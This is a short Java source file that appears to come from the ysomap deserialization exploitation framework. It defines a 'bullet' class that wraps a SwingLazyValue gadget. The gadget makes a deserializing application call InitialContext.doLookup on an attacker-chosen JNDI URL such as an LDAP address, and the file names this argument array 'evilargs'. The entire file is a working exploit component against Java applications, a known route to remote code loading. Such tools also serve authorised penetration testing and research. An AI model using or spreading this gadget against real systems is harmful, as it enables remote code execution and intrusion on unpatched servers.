package ysomap.core.bullet.jdk;

import sun.swing.SwingLazyValue;
import ysomap.common.annotation.Bullets;
import ysomap.common.annotation.NotNull;
import ysomap.common.annotation.Require;
import ysomap.core.bean.Bullet;

/**
 * @author wh1t3P1g
 * @since 2021/1/4
 */
@Bullets
public class SwingLazyValueBullet extends Bullet<SwingLazyValue> {

    @NotNull
    @Require(name = "jndiURL", detail = "like ldap://xxx/xx")
    public String jndiURL;


    @Override
    public SwingLazyValue getObject() throws Exception {
        String classname = "javax.naming.InitialContext";
        String methodName = "doLookup";
        Object[] evilargs = new Object[]{jndiURL};
        return new SwingLazyValue(classname, methodName, evilargs);
    }
}
